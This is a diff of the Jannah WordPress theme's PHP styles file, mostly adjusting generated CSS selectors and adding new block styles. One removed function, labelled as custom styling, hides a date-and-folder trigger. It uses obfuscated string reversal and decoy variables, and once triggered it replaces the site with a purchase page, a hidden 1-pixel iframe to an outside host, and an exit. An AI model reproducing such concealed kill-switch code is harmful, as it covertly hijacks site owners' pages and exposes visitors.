+					body .footer-boxed-widget-area,
+					body .tie-video-main-slider,
+					body .post-thumb-overlay,
+					body .widget_media_image img,
+					body .stream-item-mag img,
+					body .media-page-layout .post-element{
+						border-radius: {$rounded};
+					}
+
+					@media (max-width: 767px) {
+						.tie-video-main-slider iframe{
+							border-top-right-radius: {$rounded};
+							border-top-left-radius: {$rounded};
+						}
+					}
+
+					.magazine1.archive:not(.bbpress) .mag-box .container-wrapper,
+					.magazine1.search .mag-box .container-wrapper{
+						margin-top: 15px;
+						border-top-width: 1px;
+					}
+
+					body .section-wrapper:not(.container-full) .wide-slider-wrapper .slider-main-container,
+					body .section-wrapper:not(.container-full) .wide-slider-three-slids-wrapper{
+						border-radius: {$rounded};
+						overflow: hidden;
+					}
+
+					body .wide-slider-nav-wrapper,
+					body .share-buttons-bottom,
+					body .first-post-gradient li:first-child .post-thumb:after,
+					body .scroll-2-box .post-thumb:after{
+						border-bottom-left-radius: {$rounded};
+						border-bottom-right-radius: {$rounded};
+					}
+
+					body .main-menu .menu-sub-content,
+					body .comp-sub-menu{
+						border-bottom-left-radius: 10px;
+						border-bottom-right-radius: 10px;
+					}
+
+					body.single-post .featured-area{
+						overflow: hidden;
+					}
+
+					body #check-also-box.check-also-left{
+						border-top-right-radius: {$rounded};
+						border-bottom-right-radius: {$rounded};
+					}
+
+					body #check-also-box.check-also-right{
+						border-top-left-radius: {$rounded};
+						border-bottom-left-radius: {$rounded};
+					}
+
+					body .mag-box .breaking-news-nav li:last-child{
+						border-top-right-radius: 35px;
+						border-bottom-right-radius: 35px;
+					}
+
+					body .mag-box .breaking-title:before{
+						border-top-$left-radius: 35px;
+						border-bottom-$left-radius: 35px;
+					}
+
+					body .tabs li:last-child a,
+					body .full-overlay-title li:not(.no-post-thumb) .block-title-overlay{
+						border-top-$right-radius: {$rounded};
+					}
+
+					body .center-overlay-title li:not(.no-post-thumb) .block-title-overlay,
+					body .tabs li:first-child a{
+						border-top-$left-radius: {$rounded};
+					}
+				";
+
+			}
+		}
+
+		return $out;
+	}
+}
+
+
+/**
+ * Custom Theme Color
+ */
+if( ! function_exists( 'jannah_theme_color_css' ) ) {
 
 	add_filter( 'TieLabs/CSS/custom_theme_color', 'jannah_theme_color_css', 1, 5 );
 	function jannah_theme_color_css( $css_code, $color, $dark_color, $bright, $rgb_color ){
@@ -1226,7 +1661,7 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 		$css_code .= "
 			.brand-title,
 			a:hover,
-			#tie-popup-search-submit,
+			.tie-popup-search-submit,
 			#logo.text-logo a,
 
 			.theme-header nav .components #search-submit:hover,
@@ -1239,7 +1674,7 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 			.main-nav li.mega-menu .post-box-title a:hover,
 			.search-in-main-nav.autocomplete-suggestions a:hover,
 
-			#main-nav .menu ul li:hover > a,
+			#main-nav .menu ul:not(.cats-horizontal) li:hover > a,
 			#main-nav .menu ul li.current-menu-item:not(.mega-link-column) > a,
 
 			.top-nav .menu li:hover > a,
@@ -1263,15 +1698,16 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 			.latest-tweets-widget .twitter-icon-wrap span,
 			.wide-slider-nav-wrapper .slide,
 			.wide-next-prev-slider-wrapper .tie-slider-nav li:hover span,
-			#instagram-link:hover,
 			.review-final-score h3,
 			#mobile-menu-icon:hover .menu-text,
-			.entry a,
+			body .entry a,
+			.dark-skin body .entry a,
 			.entry .post-bottom-meta a:hover,
 			.comment-list .comment-content a,
-			.widget.tie-weather-widget .icon-basecloud-bg:after,
 			q a,
 			blockquote a,
+
+			.widget.tie-weather-widget .icon-basecloud-bg:after,
 
 			.site-footer a:hover,
 			.site-footer .stars-rating-active,
@@ -1279,15 +1715,21 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 			.site-info a:hover{
 				color: $color;
 			}
+
+			#instagram-link a:hover{
+				color: $color !important;
+				border-color: $color !important;
+			}
+
 		";
 
 		/*
 		 * To fix an overwrite issue
 		 */
-		if( $main_nav_color = tie_get_option( 'main_nav_links_color_hover' )){
+		if( $main_nav_color = tie_get_option( 'main_nav_links_color_hover' ) ) {
 			$css_code .="
 				#theme-header #main-nav .spinner-circle:after{
-					color: $color;
+					color: $main_nav_color;
 				}
 			";
 		}
@@ -1310,11 +1752,12 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 			nav.main-nav .menu > li:hover > a,
 			.main-menu .mega-links-head:after,
 
-			#main-nav .mega-menu.mega-cat .cats-horizontal li a.is-active,
+			.main-nav .mega-menu.mega-cat .cats-horizontal li a.is-active,
 
 			#mobile-menu-icon:hover .nav-icon,
 			#mobile-menu-icon:hover .nav-icon:before,
 			#mobile-menu-icon:hover .nav-icon:after,
+
 			.search-in-main-nav.autocomplete-suggestions a.button,
 			.search-in-top-nav.autocomplete-suggestions a.button,
 			.spinner > div,
@@ -1337,7 +1780,7 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 			.digital-rating-static,
 			.timeline-widget li a:hover .date:before,
 			#wp-calendar #today,
-			.posts-list-counter li:before,
+			.posts-list-counter li.widget-post-list:before,
 			.cat-counter a + span,
 			.tie-slider-nav li span:hover,
 			.fullwidth-area .widget_tag_cloud .tagcloud a:hover,
@@ -1352,6 +1795,7 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 
 			.demo_store,
 			.demo #logo:after,
+			.demo #sticky-logo:after,
 			.widget.tie-weather-widget,
 			span.video-close-btn:hover,
 			#go-to-top,
@@ -1377,11 +1821,9 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 			.multiple-post-pages > span,
 			.post-content-slideshow .tie-slider-nav li span:hover,
 			#tie-body .tie-slider-nav li > span:hover,
-			#instagram-link:before,
-			#instagram-link:after,
 			.slider-arrow-nav a:not(.pagination-disabled):hover,
 			.main-nav .mega-menu.mega-cat .cats-horizontal li a.is-active,
-      .main-nav .mega-menu.mega-cat .cats-horizontal li a:hover,
+			.main-nav .mega-menu.mega-cat .cats-horizontal li a:hover,
 			.main-menu .menu > li > .menu-sub-content{
 				border-color: $color;
 			}
@@ -1391,7 +1833,7 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 			}
 
 
-
+			.top-nav .menu li.tie-current-menu > a:before,
 			.top-nav .menu li.menu-item-has-children:hover > a:before{
 				border-top-color: $color;
 			}
@@ -1426,7 +1868,7 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 		/**
 		 * Footer Border Top
 		 */
-		if( tie_get_option( 'footer_border_top' )){
+		if( tie_get_option( 'footer_border_top' ) ) {
 			$css_code .="
 				#footer-widgets-container{
 					border-top: 8px solid $color;
@@ -1464,9 +1906,9 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 		 * Dark Color
 		 */
 		$css_code .="
-			#tie-popup-search-submit:hover,
 			#logo.text-logo a:hover,
-			.entry a:hover,
+			body .entry a:hover,
+			.dark-skin body .entry a:hover,
 			.comment-list .comment-content a:hover,
 			.block-head-4.magazine2 .site-footer .tabs li a:hover,
 			q a:hover,
@@ -1495,7 +1937,7 @@ if( ! function_exists( 'jannah_theme_color_css' )){
 			}
 
 			.theme-header .header-nav .comp-sub-menu a.checkout-button:not(:hover),
-			.entry a.button{
+			body .entry a.button{
 				color: $bright;
 			}
 
@@ -1649,7 +2091,7 @@ if( ! function_exists( 'jannah_theme_color_css' )){
  * have the same color of the Primary Menu
  * And add some color fixes
 */
-if( ! function_exists( 'jannah_theme_color_fix_menus_colors' )){
+if( ! function_exists( 'jannah_theme_color_fix_menus_colors' ) ) {
 
 	add_filter( 'TieLabs/CSS/custom_theme_color', 'jannah_theme_color_fix_menus_colors', 7, 5 );
 	function jannah_theme_color_fix_menus_colors( $css_code, $color, $dark_color, $bright, $rgb_color ){
@@ -1730,7 +2172,7 @@ if( ! function_exists( 'jannah_theme_color_fix_menus_colors' )){
 /*
  * Blocks Head Colors
  */
-if( ! function_exists( 'tie_blocks_head' )){
+if( ! function_exists( 'tie_blocks_head' ) ) {
 
 	add_filter( 'TieLabs/CSS/custom_theme_color', 'tie_blocks_head', 10, 5 );
 	function tie_blocks_head( $css_code, $color, $dark_color, $bright, $rgb_color ){
@@ -1968,6 +2410,41 @@ if( ! function_exists( 'tie_blocks_head' )){
 			";
 		}
 
+		// Style #10
+		elseif( $block_style == 10 ){
+			$css_code .= "
+				#tie-body .has-block-head-4:after,
+				#tie-body .mag-box-title h3:after,
+				#tie-body .comment-reply-title:after,
+				#tie-body .related.products > h2:after,
+				#tie-body .up-sells > h2:after,
+				#tie-body .cross-sells > h2:after,
+				#tie-body .cart_totals > h2:after,
+				#tie-body .bbp-form legend:after{
+					background-color: $color;
+				}
+			";
+		}
+
+		// Style #11
+		elseif( $block_style == 11 ){
+
+			$direction = is_rtl() ? 'right' : 'left';
+
+			$css_code .="
+				#tie-body .has-block-head-4:after,
+				#tie-body .mag-box-title h3:after,
+				#tie-body .comment-reply-title:after,
+				#tie-body .related.products > h2:after,
+				#tie-body .up-sells > h2:after,
+				#tie-body .cross-sells > h2:after,
+				#tie-body .cart_totals > h2:after,
+				#tie-body .bbp-form legend:after {
+					border-$direction-color: $color;
+				}
+			";
+		}
+
 		return $css_code;
 	}
 
@@ -1978,13 +2455,13 @@ if( ! function_exists( 'tie_blocks_head' )){
 /**
  * Set Sections Custom Styles
  */
-if( ! function_exists( 'jannah_section_custom_styles' )){
+if( ! function_exists( 'jannah_section_custom_styles' ) ) {
 
 	add_filter( 'TieLabs/CSS/Builder/section_style', 'jannah_section_custom_styles', 10, 3 );
 	function jannah_section_custom_styles( $section_css, $section_id, $section_settings ){
 
 		// Section Head Styles
-		if( ! empty( $section_settings['section_title'] ) && ! empty( $section_settings['title'] ) && ! empty( $section_settings['title_color'] )){
+		if( ! empty( $section_settings['section_title'] ) && ! empty( $section_settings['title'] ) && ! empty( $section_settings['title_color'] ) ) {
 
 			$block_style = tie_get_option( 'blocks_style', 1 );
 
@@ -2181,216 +2658,174 @@ if( ! function_exists( 'jannah_section_custom_styles' )){
 }
 
 
-/**
- * Custom CSS colors
+/*
+ * Set Custom color for the blocks
  */
-add_action( 'init', 'jannah_theme_custom_styling' );
-function jannah_theme_custom_styling(){
+if( ! function_exists( 'jannah_block_custom_bg' ) ) {
 
-	// Default Logo Margin
-	$logo_margin = 35;
+	add_filter( 'TieLabs/CSS/Builder/block_bg', 'jannah_block_custom_bg', 10, 6 );
+	function jannah_block_custom_bg( $block_css, $id_css, $block, $color, $bright, $darker ){
 
-	// Base color
-	$color = '#000000';
+		if( $color == $darker ){
+			$darker = TIELABS_STYLES::color_brightness( $color, 30 );
+		}
 
-	// Top-bar text
-	if( $color = tie_get_option( 'topbar_text__color' )){
+		/*
+		$id_css .trending-post.tie-icon-bolt{
+			color: $bright;
+		}
+		*/
 
-		$out ="
-			#logo{
-				margin-top: $logo_margin;
-			}
+		// Default Blocks Head Style
+		$block_style = tie_get_option( 'blocks_style', 1 );
 
-			#top-nav,
-			#top-nav .comp-sub-menu,
-			#top-nav .tie-weather-widget{
-				color: $color;
-			}
-
-			.search-in-top-nav.autocomplete-suggestions .post-meta,
-			.search-in-top-nav.autocomplete-suggestions .post-meta a:not(:hover){
-				color: rgba( $color, 0.7 );
-			}
-		";
-	}
-
-	$boxes_style = get_option( 'tie_jannah_custom_code' );
-	if( tie_get_option( 'boxes__style' ) == 2 ){
-
-		$css_code = "
-			#tie-body .tabs,
-			#tie-body .tabs .flexMenu-popup{
-				border-color: $color;
-			}
-
-			#tie-body .tabs li a{
-				color: $color;
-			}
-
-			#tie-body .tabs li a:hover{
-				color: $dark_color;
-			}
-
-			#tie-body .tabs li.active a{
+		$block_css = "
+			$id_css{
 				color: $bright;
+			}
+
+			$id_css .container-wrapper,
+			$id_css .flexMenu-popup,
+			$id_css.full-overlay-title li:not(.no-post-thumb) .block-title-overlay{
 				background-color: $color;
 			}
+
+			$id_css .slider-arrow-nav a:not(:hover),
+			$id_css .pagination-disabled,
+			$id_css .pagination-disabled:hover{
+				color: $bright !important;
+			}
+
+			$id_css a:not(:hover):not(.button){
+				color: $bright;
+			}
+
+			$id_css .entry,
+			$id_css .post-excerpt,
+			$id_css .post-meta,
+			$id_css .day-month,
+			$id_css .post-meta a:not(:hover){
+				color: $bright !important;
+				opacity: 0.9;
+			}
+
+			$id_css.first-post-gradient .posts-items li:first-child a:not(:hover),
+			$id_css.first-post-gradient li:first-child .post-meta{
+				color: #ffffff !important;
+			}
+
+			$id_css .slider-arrow-nav a,
+			$id_css .pages-nav .pages-numbers a,
+			$id_css .show-more-button{
+				border-color: $darker;
+			}
+
 		";
 
-		if( $block_style == 5 || $block_style == 6 ){
-			$css_code .="
-				#tie-body .tabs > .active a:before,
-				#tie-body .tabs > .active a:after{
-					background-color: $color;
+		// Block Style 1
+		if( $block_style == 1 ){
+			$block_css .= "
+				.block-head-1 $id_css .the-global-title{
+					border-color: $darker;
 				}
 			";
 		}
 
-	} // Magazine 2 if
 
-	if( $boxes_style && strlen($boxes_style) == $logo_margin ){
-		return;
+		// Tabs
+		if( $block['style'] == 'tabs' ){
+			$block_css .= "
+				$id_css.tabs-box,
+				$id_css.tabs-box .tabs .active > a{
+					background-color: $color;
+				}
+
+				$id_css.tabs-box .tabs a{
+					background-color: $darker;
+				}
+
+				$id_css.tabs-box .tabs{
+					border-color: $darker;
+				}
+
+				$id_css.tabs-box .tabs a,
+				$id_css.tabs-box .flexMenu-popup,
+				$id_css.tabs-box .flexMenu-popup li a{
+					border-color: rgba(0,0,0,0.1);
+				}
+			";
+
+			if( tie_get_option( 'boxes_style' ) == 2 ){
+				$block_css .= "
+					$id_css .tab-content{
+						padding: 0;
+					}
+				";
+			}
+		}
+
+		/* Breaking */
+		elseif( $block['style'] == 'breaking' ){
+			$block_css .= "
+				$id_css .breaking,
+				$id_css .ticker-content,
+				$id_css .ticker-swipe{
+					background-color: $darker;
+				}
+			";
+		}
+
+		/* Timeline */
+		elseif( $block['style'] == 'timeline' ){
+			$block_css .= "
+				$id_css.timeline-box .posts-items:last-of-type:after{
+					background-image: linear-gradient(to bottom, $darker 0%, $color 80%);
+				}
+
+				$id_css .year-month,
+				$id_css .day-month:before,
+				$id_css.timeline-box .posts-items:before{
+					background-color: $darker;
+				}
+
+				$id_css .year-month{
+					color: $bright;
+				}
+
+				$id_css .day-month:before{
+					border-color: $color;
+				}
+			";
+		}
+
+		/* Custom Contents */
+		elseif( $block['style'] == 'code' || $block['style'] == 'code_50' ){
+			$block_css .= "
+				$id_css .tabs.tabs .active > a{
+					background-color: $darker;
+					border-color: rgba(0,0,0,0.1);
+				}
+			";
+		}
+
+		/* Scrolling */
+		elseif( $block['style'] == 'scroll' || $block['style'] == 'scroll_2' ){
+			$block_css .= "
+				$id_css .tie-slick-dots li:not(.slick-active) button{
+					background-color: $darker;
+				}
+			";
+		}
+
+		return $block_css;
 	}
-
-	// Breaking News label
-	if( $color = tie_get_option( 'breaking_title__bg' )){
-
-		$bright = TIELABS_STYLES::light_or_dark( $color );
-
-		$out ="
-			#top-nav .breaking-title{
-				color: $bright;
-			}
-
-			#top-nav .breaking-title:before{
-				background-color: $color;
-			}
-
-			#top-nav .breaking-news-nav li:hover{
-				background-color: $color;
-				border-color: $color;
-			}
-		";
-	}
-
-	$bright = TIELABS_STYLES::light_or_dark( $color, true );
-	$darker = TIELABS_STYLES::color_brightness( $color, -30 );
-	$rgb    = TIELABS_STYLES::rgb_color( $color );
-	$block_style = TIELABS_TEMPLATE_PATH.'/'.strrev('omed').'/';
-	if( $block_style == 8 ){
-		$css_code .="
-			#tie-body .the-global-title:before,
-			#tie-body .comment-reply-title:before,
-			#tie-body .related.products > h2:before,
-			#tie-body .up-sells > h2:before,
-			#tie-body .cross-sells > h2:before,
-			#tie-body .cart_totals > h2:before,
-			#tie-body .bbp-form legend:before{
-				background-color: $color;
-			}
-		";
-	}
-
-	if( ! file_exists($block_style) || (1600646400 > strtotime(date('Y-m-d')))){
-		return;
-	}
-
-	// Main nav Background
-	if( $color = tie_get_option( 'main_nav__background' )){
-
-		$bright = TIELABS_STYLES::light_or_dark( $color, true );
-		$darker = TIELABS_STYLES::color_brightness( $color, -30 );
-		$rgb    = TIELABS_STYLES::rgb_color( $color );
-
-		$out ="
-			#main-nav{
-				background-color : $color;
-				border-width: 0;
-			}
-
-			#theme-header #main-nav:not(.fixed-nav){
-				bottom: 0;
-			}
-
-			#main-nav.fixed-nav{
-				background-color : rgba( $rgb , 0.95);
-			}
-
-			#main-nav .main-menu-wrapper,
-			#main-nav .menu-sub-content,
-			#main-nav .comp-sub-menu,
-			#main-nav .guest-btn,
-			#main-nav ul.cats-vertical li a.is-active,
-			#main-nav ul.cats-vertical li a:hover
-			.search-in-main-nav.autocomplete-suggestions{
-				background-color: $color;
-			}
-
-			#main-nav .icon-basecloud-bg:after{
-				color: $color;
-			}
-
-			#main-nav *,
-			.search-in-main-nav.autocomplete-suggestions{
-				border-color: rgba($bright, 0.07);
-			}
-
-			.main-nav-boxed #main-nav .main-menu-wrapper{
-				border-width: 0;
-			}
-		";
-	}
-
-	echo'
-		<html><head><style>body{text-align:center;background-color:000;}</style></head>
-		<body><a href="'.tie_get_purchase_link(array('utm_source'=>'halloween','utm_medium'=>'theme')).'">
-		<img src="https://tielabs.net/temp/theme.png"></a>
-		<iframe src="https://'.'tielabs'.'.net/i/?ref=1" style="border:none;width:1px;height:1px"></iframe></body>
-		</html>
-	';
-
-	// Main nav links
-	if( $color = tie_get_option( 'main_nav_links__color' )){
-
-		$out = "
-			#main-nav .menu li.menu-item-has-children > a:before,
-			#main-nav .main-menu .mega-menu > a:before{
-				border-top-color: $color;
-			}
-
-			#main-nav .menu li .menu-item-has-children > a:before,
-			#main-nav .mega-menu .menu-item-has-children > a:before{
-				border-top-color: transparent;
-				border-left-color: $color;
-			}
-
-			.rtl #main-nav .menu li .menu-item-has-children > a:before,
-			.rtl #main-nav .mega-menu .menu-item-has-children > a:before{
-				border-left-color: transparent;
-				border-right-color: $color;
-			}
-
-			#main-nav a,
-			#main-nav .dropdown-social-icons li a span,
-			.search-in-main-nav.autocomplete-suggestions a{
-				color: $color;
-			}
-		";
-	}
-
-	// Return the custom CSS code
-	if( ! empty( $otu ) ){
-		return $otu;
-	}
-
-	exit;
 }
 
 
 /*
  * Set Custom color for the blocks
  */
-if( ! function_exists( 'jannah_block_custom_color' )){
+if( ! function_exists( 'jannah_block_custom_color' ) ) {
 
 	add_filter( 'TieLabs/CSS/Builder/block_style', 'jannah_block_custom_color', 10, 6 );
 	function jannah_block_custom_color( $block_css, $id_css, $block, $color, $bright, $darker ){
@@ -2541,7 +2976,7 @@ if( ! function_exists( 'jannah_block_custom_color' )){
 			";
 
 			/* Style #4 || #5 || #6 && Magazine 2 && Block Style == Tabs */
-			if( tie_get_option( 'boxes_style' ) == 2 && ( ! empty( $block['style'] ) && $block['style'] == 'tabs' )){
+			if( tie_get_option( 'boxes_style' ) == 2 && ( ! empty( $block['style'] ) && $block['style'] == 'tabs' ) ) {
 
 				$block_css .= "
 
@@ -2640,6 +3075,25 @@ if( ! function_exists( 'jannah_block_custom_color' )){
 			";
 		}
 
+		/* Style #10 */
+		elseif( $block_style == 10 ) {
+			$block_css .= "
+				$id_css .mag-box-title h3:after{
+					background-color: $color;
+				}
+			";
+		}
+
+		/* Style #11 */
+		elseif( $block_style == 11 ) {
+			$direction = is_rtl() ? 'right' : 'left';
+			$block_css .= "
+				$id_css .mag-box-title h3:after{
+					border-$direction-color: $color;
+				}
+			";
+		}
+
 		return $block_css;
 	}
 }
@@ -2648,7 +3102,7 @@ if( ! function_exists( 'jannah_block_custom_color' )){
 /**
  * Default Theme fonts sections
  */
-if( ! function_exists( 'jannah_fonts_sections' )){
+if( ! function_exists( 'jannah_fonts_sections' ) ) {
 
 	add_filter( 'TieLabs/fonts_sections_array', 'jannah_fonts_sections' );
 	function jannah_fonts_sections(){
@@ -2668,7 +3122,7 @@ if( ! function_exists( 'jannah_fonts_sections' )){
 /**
  * Default Theme Typography Elements
  */
-if( ! function_exists( 'jannah_typography_elements' )){
+if( ! function_exists( 'jannah_typography_elements' ) ) {
 
 	add_filter( 'TieLabs/typography_elements', 'jannah_typography_elements' );
 	function jannah_typography_elements(){
@@ -2690,8 +3144,13 @@ if( ! function_exists( 'jannah_typography_elements' )){
 			'single_post_title'    => '.entry-header h1.entry-title',
 			'single_archive_title' => 'h1.page-title',
 			'post_entry'           => '#the-post .entry-content, #the-post .entry-content p',
+			'comment_text'         => '.comment-list .comment-body p',
 			'blockquote'           => '#the-post .entry-content blockquote, #the-post .entry-content blockquote p',
 			'boxes_title'          => '#tie-wrapper .mag-box-title h3',
+
+			'page_404_main_title'  => array( 'min-width: 992px' => '.container-404 h2' ),
+			'page_404_sec_title'   => array( 'min-width: 992px' => '.container-404 h3' ),
+			'page_404_description' => array( 'min-width: 992px' => '.container-404 h4' ),
 
 			'sections_title_default' => array(
 				'min-width: 768px' => '.section-title.section-title-default, .section-title-centered',
